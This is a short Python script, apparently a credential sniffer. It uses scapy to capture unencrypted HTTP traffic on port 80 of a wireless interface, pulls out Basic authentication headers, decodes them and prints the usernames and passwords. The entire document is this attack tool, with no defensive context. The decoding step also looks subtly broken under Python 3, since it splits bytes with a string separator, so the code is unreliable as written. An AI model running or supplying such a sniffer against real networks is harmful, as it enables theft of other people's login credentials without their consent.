#!/usr/bin/python3

import re
from base64 import b64decode
from scapy.all import sniff

dev = "wlp2s0"

def handle_packet(packet):
    tcp = packet.getlayer("TCP")
    match = re.search(r"Authorization: Basic (.+)",
                      str(tcp.payload))

    if match:
        auth_str = b64decode(match.group(1))
        auth = auth_str.split(":")
        print("User: " + auth[0] + " Pass: " + auth[1])

sniff(iface=dev,
      store=0,
      filter="tcp and port 80",
      prn=handle_packet)
